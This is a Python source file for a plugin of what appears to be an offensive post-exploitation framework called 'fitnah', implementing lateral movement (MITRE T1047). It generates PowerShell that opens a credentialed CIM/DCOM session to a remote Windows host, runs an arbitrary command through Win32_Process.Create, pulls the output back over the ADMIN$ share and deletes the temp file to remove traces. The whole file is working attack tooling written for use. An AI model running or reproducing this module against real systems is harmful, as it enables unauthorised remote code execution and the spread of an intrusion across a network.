"""lateral_movement/wmi_exec — remote execution via CIM Win32_Process.Create. MITRE T1047"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class WmiExec(BasePlugin):
    NAME        = "wmi_exec"
    DESCRIPTION = "Invoke-CimMethod Win32_Process.Create on remote host; optional output capture via ADMIN$."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1047"
    CATEGORY    = "lateral_movement"
    schema      = ParamSchema().add(
        Param("target",   str,  required=True,  help="Target hostname or IP"),
        Param("cmd",      str,  required=True,  help="Command to run remotely"),
        Param("username", str,  required=False, default="", help="Username (DOMAIN\\user)"),
        Param("password", str,  required=False, default="", help="Password"),
        Param("output",   bool, required=False, default=False,
              help="Capture command output via ADMIN$ temp file"),
        Param("wait_sec", int,  required=False, default=5,
              help="Seconds to wait before reading output"),
    )

    @mitre("T1047")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        target  = params["target"]
        cmd     = params["cmd"].replace("'", "''")
        user    = params.get("username", "")
        pwd     = params.get("password", "")
        capture = params.get("output", False)
        wait    = params.get("wait_sec", 5)

        # If capturing output, wrap command to redirect to temp file
        out_var = ""
        if capture:
            out_var = "$outFile = 'C:\\Windows\\Temp\\wmi_' + (Get-Random) + '.out';"
            # Wrap cmd
            exec_cmd = f"cmd.exe /c {cmd} > \" + $outFile + \" 2>&1"
        else:
            exec_cmd = cmd

        if user:
            session_block = (
                f"$ss = ConvertTo-SecureString '{pwd}' -AsPlainText -Force;"
                f"$cred = New-Object System.Management.Automation.PSCredential('{user}', $ss);"
                "$opt  = New-CimSessionOption -Protocol Dcom;"
                f"$sess = New-CimSession -ComputerName '{target}' -Credential $cred -SessionOption $opt -EA Stop;"
                "$useSess = $true;"
            )
            invoke_block = (
                f"$r = Invoke-CimMethod -CimSession $sess -ClassName Win32_Process -MethodName Create"
                f" -Arguments @{{CommandLine='{exec_cmd}'}} -EA Stop;"
            )
            cleanup_sess = "Remove-CimSession $sess -EA SilentlyContinue;"
        else:
            session_block = "$useSess = $false;"
            invoke_block = (
                f"$r = Invoke-CimMethod -ComputerName '{target}' -ClassName Win32_Process"
                f" -MethodName Create -Arguments @{{CommandLine='{exec_cmd}'}} -EA Stop;"
            )
            cleanup_sess = ""

        output_block = ""
        if capture:
            output_block = (
                f"Start-Sleep -Seconds {wait};"
                "$uncOut = \"\\\\\" + $tgt + \"\\ADMIN$\\Temp\\\" + ($outFile -split '\\\\' | Select-Object -Last 1);"
                "if (Test-Path $uncOut) {"
                "  '[Output]'; Get-Content $uncOut -EA SilentlyContinue;"
                "  Remove-Item $uncOut -Force -EA SilentlyContinue"
                "} else { '[-] Output file not found: ' + $uncOut };"
            )

        ps = (
            f"$tgt = '{target}';"
            "$results = @();"
            + out_var
            + "try {"
            + session_block
            + invoke_block
            + "$results += \"[+] WMI Exec: ReturnValue=$($r.ReturnValue) PID=$($r.ProcessId)\";"
            + cleanup_sess
            + output_block
            + "} catch { $results += \"[-] WMI exec failed: $_\" };"
            "$results -join \"`n\""
        )
        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"])
